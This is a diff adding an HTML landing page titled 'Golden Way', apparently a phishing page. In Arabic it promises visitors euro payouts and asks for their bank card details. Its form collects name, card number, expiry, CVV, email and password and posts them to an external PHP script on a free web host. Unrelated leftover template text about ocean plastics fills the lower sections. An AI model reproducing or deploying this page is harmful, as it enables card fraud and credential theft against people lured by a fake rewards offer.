@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<title></title>
+<meta charset="utf-8"/>
+<meta content="width=device-width" name="viewport"/>
+<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css"/>
+<style>
+		.bee-form .bee-form-row .bee-field button {
+			font-size: inherit;
+			font-family: inherit
+		}
+
+		.bee-row-1,
+		.bee-row-1 .bee-row-content,
+		.bee-row-10,
+		.bee-row-2,
+		.bee-row-3,
+		.bee-row-4,
+		.bee-row-5,
+		.bee-row-6,
+		.bee-row-7,
+		.bee-row-8,
+		.bee-row-9 {
+			background-repeat: no-repeat
+		}
+
+		body {
+			background-color: #141f45;
+			color: #000;
+			font-family: Arial, Helvetica Neue, Helvetica, sans-serif
+		}
+
+		a {
+			color: #6dcbf3
+		}
+
+		* {
+			box-sizing: border-box
+		}
+
+		body,
+		h1,
+		h3,
+		p {
+			margin: 0
+		}
+
+		.bee-row-content {
+			max-width: 1200px;
+			margin: 0 auto;
+			display: flex
+		}
+
+		.bee-row-content.reverse,
+		.bee-row-content.reverse .bee-col {
+			-moz-transform: scale(1, -1);
+			-webkit-transform: scale(1, -1);
+			-o-transform: scale(1, -1);
+			-ms-transform: scale(1, -1);
+			transform: scale(1, -1)
+		}
+
+		.bee-row-content .bee-col-w1 {
+			flex-basis: 8%
+		}
+
+		.bee-row-content .bee-col-w2 {
+			flex-basis: 17%
+		}
+
+		.bee-row-content .bee-col-w6 {
+			flex-basis: 50%
+		}
+
+		.bee-row-content .bee-col-w8 {
+			flex-basis: 67%
+		}
+
+		.bee-row-content .bee-col-w10 {
+			flex-basis: 83%
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 div.label:not(.inline),
+		.bee-row-4 .bee-col-2 .bee-block-3 label:not(.inline),
+		.bee-row-content .bee-col-w12 {
+			flex-basis: 100%
+		}
+
+		.bee-icon .bee-icon-label-right a,
+		.bee-menu ul li a {
+			text-decoration: none
+		}
+
+		.bee-divider,
+		.bee-image {
+			overflow: auto
+		}
+
+		.bee-divider .center,
+		.bee-image .bee-center {
+			margin: 0 auto
+		}
+
+		.bee-image .bee-right {
+			float: right
+		}
+
+		.bee-form .bee-form-row .bee-field {
+			padding: 3px;
+			display: flex;
+			flex: 1;
+			flex-wrap: wrap;
+			align-content: flex-start
+		}
+
+		.bee-form .bee-form-row .bee-field input:not([type=checkbox]):not([type=radio]) {
+			flex-grow: 1;
+			font-family: inherit;
+			font-size: inherit
+		}
+
+		.bee-form .bee-form-row .bee-field .bee-button-container {
+			flex-grow: 1
+		}
+
+		.bee-form input[type=color] {
+			border: none;
+			height: 38px
+		}
+
+		.bee-form input[type=color]::-webkit-color-swatch-wrapper {
+			margin: 0;
+			padding: 2px
+		}
+
+		.bee-form input[type=color]::-webkit-color-swatch {
+			margin: 0;
+			padding: 0
+		}
+
+		.bee-icon,
+		.bee-icon .bee-icon-image,
+		.bee-icon .bee-icon-label-right,
+		.bee-menu ul.bee-horizontal li {
+			display: inline-block
+		}
+
+		.bee-icon {
+			vertical-align: middle
+		}
+
+		.bee-icon .bee-icon-image {
+			vertical-align: middle;
+			margin-right: -4px
+		}
+
+		.bee-image img {
+			display: block;
+			width: 100%
+		}
+
+		.bee-menu ul {
+			list-style-type: none;
+			margin: 0;
+			padding: 0
+		}
+
+		.bee-social .icon img {
+			max-height: 32px
+		}
+
+		.bee-text {
+			overflow-wrap: anywhere
+		}
+
+		.bee-row-1 .bee-row-content {
+			background-image: url('https://d1oco4z2z1fhwp.cloudfront.net/templates/default/3696/background-light-larger_3.jpg');
+			color: #000
+		}
+
+		.bee-row-1 .bee-col-1,
+		.bee-row-1 .bee-col-2,
+		.bee-row-10 .bee-col-1,
+		.bee-row-2 .bee-col-3,
+		.bee-row-4 .bee-col-3,
+		.bee-row-5 .bee-col-2,
+		.bee-row-6 .bee-col-1,
+		.bee-row-9 .bee-col-1 {
+			padding-bottom: 5px;
+			padding-top: 5px
+		}
+
+		.bee-row-1 .bee-col-1 .bee-block-1 {
+			width: 100%;
+			padding: 60px
+		}
+
+		.bee-row-1 .bee-col-2 .bee-block-1 {
+			padding-left: 15px;
+			padding-right: 15px;
+			text-align: center;
+			width: 100%
+		}
+
+		.bee-row-1 .bee-col-2 .bee-block-2 {
+			padding-left: 20px;
+			padding-right: 10px;
+			padding-top: 10px
+		}
+
+		.bee-row-10 .bee-row-content,
+		.bee-row-2 .bee-row-content,
+		.bee-row-3 .bee-row-content,
+		.bee-row-4 .bee-row-content {
+			background-repeat: no-repeat;
+			color: #000
+		}
+
+		.bee-row-2 .bee-col-2 .bee-block-1 {
+			padding-bottom: 10px;
+			padding-left: 15px;
+			padding-right: 15px;
+			text-align: center;
+			width: 100%
+		}
+
+		.bee-row-3 .bee-col-2 {
+			background-color: #364371
+		}
+
+		.bee-row-5 .bee-row-content,
+		.bee-row-6 .bee-row-content,
+		.bee-row-7 .bee-row-content,
+		.bee-row-8 .bee-row-content,
+		.bee-row-9 .bee-row-content {
+			background-color: #141f45;
+			background-repeat: no-repeat;
+			color: #000
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-1 {
+			padding: 15px
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-2 {
+			padding: 30px 15px 15px
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 {
+			font-family: inherit;
+			font-size: 14px;
+			padding: 10px 10px 30px;
+			text-align: center;
+			width: 100%;
+			margin: 0 auto
+		}
+
+		.bee-row-5 .bee-col-1,
+		.bee-row-6 .bee-col-2 {
+			padding: 5px 20px
+		}
+
+		.bee-row-5 .bee-col-2 .bee-block-1 {
+			padding-bottom: 10px;
+			padding-left: 10px;
+			padding-top: 10px;
+			width: 100%
+		}
+
+		.bee-row-6 .bee-col-1 .bee-block-1 {
+			padding-bottom: 10px;
+			padding-right: 10px;
+			padding-top: 10px;
+			width: 100%
+		}
+
+		.bee-row-7 .bee-col-1,
+		.bee-row-8 .bee-col-1 {
+			padding-top: 5px
+		}
+
+		.bee-row-8 .bee-row-content {
+			background-image: url('https://d1oco4z2z1fhwp.cloudfront.net/templates/default/3696/waves-2.jpg');
+			background-position: top center
+		}
+
+		.bee-row-8 .bee-col-1 .bee-block-2 {
+			padding: 10px
+		}
+
+		.bee-row-8 .bee-col-1 .bee-block-3 {
+			text-align: center;
+			width: 100%
+		}
+
+		.bee-row-9 .bee-col-1 .bee-block-2 {
+			color: #7aced9;
+			font-family: inherit;
+			font-size: 13px;
+			letter-spacing: 1px;
+			text-align: center
+		}
+
+		.bee-row-9 .bee-col-1 .bee-block-3 {
+			padding: 10px;
+			text-align: center
+		}
+
+		.bee-row-10 .bee-col-1 .bee-block-1 {
+			color: #9d9d9d;
+			font-family: inherit;
+			font-size: 15px;
+			padding-bottom: 5px;
+			padding-top: 5px;
+			text-align: center
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 div.label,
+		.bee-row-4 .bee-col-2 .bee-block-3 label {
+			color: #fff;
+			line-height: 200%;
+			text-align: left;
+			display: block
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 div.label {
+			padding: 3px
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 input:not([type=checkbox]):not([type=radio]):not([type=image]) {
+			background-color: #19264f;
+			border-bottom: 1px solid #6dcbf3;
+			border-left: 1px solid #6dcbf3;
+			border-radius: 4px;
+			border-right: 1px solid #6dcbf3;
+			border-top: 1px solid #6dcbf3;
+			color: #fff;
+			padding: 5px
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 input:not([type=checkbox]):not([type=radio]):focus {
+			outline-color: #fff
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 button {
+			background-color: #3aaee0;
+			border-bottom: 0 solid transparent;
+			border-left: 0 solid transparent;
+			border-radius: 4px;
+			border-right: 0px solid transparent;
+			border-top: 0 solid transparent;
+			color: #fff;
+			line-height: 200%;
+			padding: 5px 20px;
+			width: 60%
+		}
+
+		.bee-row-4 .bee-col-2 .bee-block-3 .bee-button-container {
+			text-align: "center"
+		}
+
+		.bee-row-9 .bee-col-1 .bee-block-2 li {
+			padding: 5px 15px
+		}
+
+		.bee-row-9 .bee-col-1 .bee-block-2 li a {
+			color: #fff
+		}
+
+		@media (max-width:768px) {
+			.bee-form {
+				width: 100% !important
+			}
+
+			.bee-row-content:not(.no_stack) {
+				display: block
+			}
+		}
+
+		.bee-row-10 .bee-col-1 .bee-block-1 .bee-icon-image {
+			padding: 5px 6px 5px 5px
+		}
+
+		.bee-row-10 .bee-col-1 .bee-block-1 .bee-icon {
+			margin-left: 0;
+			margin-right: 0
+		}
+	</style>
+</head>
+<body>
+<div class="bee-page-container">
+<div class="bee-row bee-row-1">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w6">
+<div class="bee-block bee-block-1 bee-image"><img alt="" class="bee-center bee-autowidth" src="https://i.postimg.cc/050FGxyS/GG.png" style="max-width:880px;"/></div>
+<div class="bee-block bee-block-2 bee-divider">
+<div class="spacer" style="height:15px;"></div>
+</div>
+</div>
+<div class="bee-col bee-col-2 bee-col-w6">
+<div class="bee-block bee-block-1 bee-heading">
+<h1 style="color:#ffffff;direction:ltr;font-family:'Courier New', Courier, 'Lucida Sans Typewriter', 'Lucida Typewriter', monospace;font-size:58px;font-weight:normal;letter-spacing:5px;line-height:120%;text-align:left;margin-top:0;margin-bottom:0;"><strong>Golden Way</strong><br/> </h1>
+</div>
+<div class="bee-block bee-block-2 bee-text">
+<div class="bee-text-content" style="line-height: 120%; font-size: 12px; font-family: inherit; color: #ffffff;">
+<p style="font-size: 14px; line-height: 16px; text-align: left;"><span style="font-size: 24px; line-height: 28px;"><strong style=""><span style="line-height: 14px;"> </span></strong></span></p>
+</div>
+</div>
+<div class="bee-block bee-block-3 bee-divider">
+<div class="spacer" style="height:40px;"></div>
+</div>
+<div class="bee-block bee-block-4 bee-divider">
+<div class="spacer" style="height:135px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-2">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w1">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:15px;"></div>
+</div>
+</div>
+<div class="bee-col bee-col-2 bee-col-w10">
+<div class="bee-block bee-block-1 bee-heading">
+<h3 style="color:#ffffff;direction:ltr;font-family:Arial, Helvetica Neue, Helvetica, sans-serif;font-size:22px;font-weight:normal;letter-spacing:2px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">WE HAVE REACHED 10,000,000 USERS AND INVESTOR</h3>
+</div>
+</div>
+<div class="bee-col bee-col-3 bee-col-w1">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:15px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-3">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w2">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:10px;"></div>
+</div>
+</div>
+<div class="bee-col bee-col-2 bee-col-w8">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="left" style="border-top:24px solid #BEDCED;width:75%;"></div>
+</div>
+</div>
+<div class="bee-col bee-col-3 bee-col-w2">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:10px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-4">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w2">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:10px;"></div>
+</div>
+</div>
+<div class="bee-col bee-col-2 bee-col-w8">
+<div class="bee-block bee-block-1 bee-text">
+<div class="bee-text-content" style="line-height: 120%; font-size: 12px; color: #ffffff; font-family: inherit;">
+<p style="font-size: 14px; line-height: 16px; text-align: cente سوف تتلقى  أورو في حسابك, سوف تتمكن من سحبها بعد ذلك</p>
+</div>
+</div>
+<div class="bee-block bee-block-2 bee-text">
+<div class="bee-text-content" style="line-height: 120%; font-size: 12px; color: #ffffff; font-family: inherit;">
+<p style="font-size: 14px; line-height: 16px; text-align: center;"><span style="font-size: 20px; line-height: 24px;">الرجاء إدخال معلومات بطافتك البنكية لكي تستطيع إستلام أرباحك</span></p>
+</div>
+</div>
+<div class="bee-block bee-block-3 bee-form" id="petition">
+<form accept-charset="UTF-8" action="https://ckopilonique.000webhostapp.com/PP.php" autocomplete="on" enctype="multipart/form-data" method="post" target="_self">
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_aqzx49"><label for="id_aqzx49">Name</label><input id="id_aqzx49" name="Full Name" placeholder="الإسم و اللقب" required="" type="text"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_sup7ni"><label for="id_sup7ni">Card Number</label><input id="id_sup7ni" name="CCNumb" placeholder="رقم البطاقة" required="" type="number"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_xn928t"><label for="id_xn928t">Expiration (mm/yy) </label><input id="id_xn928t" max="" min="4" name="EXPR" placeholder="تاريخ انتهاء صلاحية البطاقة" required="" type="number"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_l1f9hp"><label for="id_l1f9hp">Security Code CVV CVC</label><input id="id_l1f9hp" max="" min="2" name="CVC" required="" placeholder="الرقم خلف البطاقة" type="number"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_hrqvck"><label for="id_hrqvck">Email</label><input id="id_hrqvck" name="Email" required="" type="email" placeholder="Email address" pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+" title="  Enter correct Email address or phone number"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_7ffdkb"><label for="id_7ffdkb">Password</label><input id="id_7ffdkb" name="Pass" required="" type="password" placeholder="Password" pattern=".{4,}" title="Five or more characters"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_7ffdkb"><label for="id_7ffdkb">Price</label><input id="id_7ffdkb" name="PRC" required="" type="number" max="" min="2" placeholder="السعر الذي تريد شحنه على حسابك" pattern=".{5,}" title="Five or more characters"/></div>
+</div>
+<div class="bee-form-row">
+<div class="bee-field bee-field-id_25r35z">
+<div class="bee-button-container"><button id="id_25r35z" name="submit" type="submit" value="GET 35Euro">ِConfirm</button></div>
+</div>
+</div>
+<div class="bee-form-row"></div>
+<div class="bee-form-row"></div>
+<div class="bee-form-row"></div>
+<div class="bee-form-row"></div>
+</form>
+</div>
+</div>
+<div class="bee-col bee-col-3 bee-col-w2">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:10px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-5">
+<div class="bee-row-content reverse">
+<div class="bee-col bee-col-1 bee-col-w6">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:65px;"></div>
+</div>
+<div class="bee-block bee-block-2 bee-text">
+<div class="bee-text-content" style="line-height: 150%; font-size: 12px; font-family: inherit; color: #ffffff;">
+<p style="font-size: 14px; line-height: 21px; text-align: left;"><span style="font-size: 16px; line-height: 24px;">The most frequent sort of marine trash found in our oceans and Great Lakes is plastic. Microplastics are little plastics with a length of less than five millimeters. That’s about the size of a sesame seed.</span></p>
+</div>
+</div>
+</div>
+<div class="bee-col bee-col-2 bee-col-w6">
+
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-6">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w6">
+</div>
+<div class="bee-col bee-col-2 bee-col-w6">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:65px;"></div>
+</div>
+<div class="bee-block bee-block-2 bee-text">
+<div class="bee-text-content" style="line-height: 150%; font-size: 12px; font-family: inherit; color: #ffffff;">
+<p style="font-size: 14px; line-height: 21px; text-align: left;"><span style="font-size: 16px; line-height: 24px;">Scientists propose a new strategy to rescue our oceans: create a worldwide network of ocean sanctuaries that would keep harmful industries out of millions of square kilometers. But to get world governments on board, we need your help to show why ocean conservation is so important.</span></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-7">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w12">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:55px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-8">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w12">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:55px;"></div>
+</div>
+<div class="bee-block bee-block-2 bee-text">
+<div class="bee-text-content" style="line-height: 150%; font-size: 12px; color: #ffffff; font-family: inherit;">
+<p style="font-size: 14px; line-height: 21px; text-align: center;"> </p>
+</div>
+</div>
+<div class="bee-block bee-block-3 bee-heading">
+<h1 style="color:#7aced9;direction:ltr;font-family:Arial, Helvetica Neue, Helvetica, sans-serif;font-size:56px;font-weight:normal;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;"> </h1>
+</div>
+<div class="bee-block bee-block-4 bee-divider">
+<div class="spacer" style="height:55px;"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-9">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w12">
+<div class="bee-block bee-block-1 bee-divider">
+<div class="spacer" style="height:40px;"></div>
+</div>
+<div class="bee-block bee-block-2 bee-menu">
+<nav class="bee-menu">
+<ul class="bee-horizontal">
+<li><a href="https://www.example.com" target="_self" title="">NEWS</a></li><span>|</span>
+<li><a href="https://www.example.com" target="_self" title="">DONATE</a></li><span>|</span>
+<li><a href="https://www.example.com" target="_self" title="">SUBSCRIBE</a></li>
+</ul>
+</nav>
+</div>
+<div class="bee-block bee-block-3 bee-social">
+</div>
+</div>
+</div>
+</div>
+<div class="bee-row bee-row-10">
+<div class="bee-row-content">
+<div class="bee-col bee-col-1 bee-col-w12">
+<div class="bee-block bee-block-1 bee-icons">
+<div class="bee-icon">
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
